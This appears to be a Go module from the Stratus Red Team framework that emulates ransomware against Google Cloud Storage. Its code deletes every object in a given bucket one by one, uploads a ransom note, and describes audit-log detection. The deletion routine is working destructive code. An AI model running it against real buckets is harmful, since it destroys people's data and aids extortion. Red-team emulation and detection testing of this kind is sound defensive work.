package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"cloud.google.com/go/storage"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"google.golang.org/api/iterator"
)

//go:embed main.tf
var tf []byte

const ransomNote = `Your data has been encrypted and exfiltrated.
To recover your files, contact: attacker@stratus-red-team.cloud
Your unique ID: STRATUS-RED-TEAM-SIMULATION
This is a security simulation by Stratus Red Team.`

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.impact.ransomware-gcs-individual-deletion",
		FriendlyName: "Ransomware Simulation — Delete GCS Objects Individually",
		Description: `
Simulates a GCS ransomware attack by deleting objects one by one sequentially
and uploading a ransom note. Unlike the batch variant, individual deletions
produce a clear sequential pattern in audit logs, making the attack more
detectable but also modeling a simpler adversary tool that lacks parallelism.

Warm-up:

- Create a GCS bucket with 10 test objects

Detonation:

- List all objects in the bucket
- Delete each object individually in sequence
- Upload a ransom note as <code>RANSOM_NOTE.txt</code>

References:

- https://cloud.google.com/storage/docs/deleting-objects
- https://cloud.google.com/storage/docs/json_api/v1/objects/delete
- https://panther.com/blog/detecting-and-hunting-for-cloud-ransomware-part-2-gcp-gcs
- https://www.paloaltonetworks.com/blog/prisma-cloud/ransomware-data-protection-cloud/
`,
		Detection: `
Identify sequential GCS object deletions by monitoring for a stream of
<code>storage.objects.delete</code> events in GCP Data Access audit logs
where the same principal deletes multiple objects in rapid succession,
particularly when followed by the creation of <code>RANSOM_NOTE.txt</code>.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	storageClient, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Storage client: %w", err)
	}
	defer storageClient.Close()

	bucket := storageClient.Bucket(bucketName)

	log.Printf("Listing objects in bucket %s\n", bucketName)
	var objectNames []string
	it := bucket.Objects(ctx, nil)
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("failed to list objects in bucket %s: %w", bucketName, err)
		}
		objectNames = append(objectNames, attrs.Name)
	}

	log.Printf("Deleting %d objects from bucket %s one by one\n", len(objectNames), bucketName)
	for i, name := range objectNames {
		log.Printf("Deleting object %d/%d: %s\n", i+1, len(objectNames), name)
		if err := bucket.Object(name).Delete(ctx); err != nil {
			return fmt.Errorf("failed to delete object %s: %w", name, err)
		}
	}

	log.Printf("Successfully deleted %d objects. Uploading ransom note.\n", len(objectNames))
	writer := bucket.Object("RANSOM_NOTE.txt").NewWriter(ctx)
	if _, err := fmt.Fprint(writer, ransomNote); err != nil {
		writer.Close()
		return fmt.Errorf("failed to write ransom note: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("failed to finalize ransom note upload: %w", err)
	}

	log.Printf("Ransomware simulation complete. Ransom note uploaded to gs://%s/RANSOM_NOTE.txt\n", bucketName)
	return nil
}
